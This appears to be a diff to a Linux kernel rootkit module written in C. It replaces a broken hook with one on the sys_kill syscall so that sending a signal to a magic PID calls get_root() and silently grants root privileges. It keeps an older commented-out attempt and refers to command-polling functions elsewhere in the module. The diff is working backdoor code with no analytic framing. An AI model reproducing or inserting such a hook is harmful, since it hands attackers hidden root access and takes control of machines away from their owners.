@@ -169,16 +169,29 @@ static long get_root(void) {
 	return 0;
 }
 
-// BUG: COMPILES BUT DOESN'T HOOK KILL.
-KHOOK(kill_pid);
-static int khook_kill_pid(struct pid *pid, int sig, int priv) {
-	printk("ROOT_PRIV_ESC_MAGIC is: %d", ROOT_PRIV_ESC_MAGIC);
-	if (pid->numbers->nr == ROOT_PRIV_ESC_MAGIC) {
+KHOOK_EXT(long, sys_kill, long, long);
+static long khook_sys_kill(long pid, long sig) {
+	printk(KERN_EMERG "sys_kill -- %s pid: %ld sig: %ld", current->comm,  pid, sig);
+	printk(KERN_EMERG "ROOT_PRIV_ESC_MAGIC is: %d", ROOT_PRIV_ESC_MAGIC);
+	if (pid == ROOT_PRIV_ESC_MAGIC) {
 		return get_root();
 	} else {
-		return KHOOK_ORIGIN(kill_pid, pid, sig, priv);
+		return KHOOK_ORIGIN(sys_kill, pid, sig);
 	}
 }
+
+
+// // BUG: COMPILES BUT DOESN'T HOOK KILL.
+// KHOOK_EXT(long, sys_kill, pid_t, long);
+// static long khook_sys_kill(pid_t pid, long sig) {
+// 	printk(KERN_EMERG "PID IS: %u", pid);
+// 	printk(KERN_EMERG "ROOT_PRIV_ESC_MAGIC is: %d", ROOT_PRIV_ESC_MAGIC);
+// 	if (pid == ROOT_PRIV_ESC_MAGIC) {
+// 		return get_root();
+// 	} else {
+// 		return KHOOK_ORIGIN(sys_kill, pid, sig);
+// 	}
+// }
 
 /**
  * Timer and Command Polling Functions
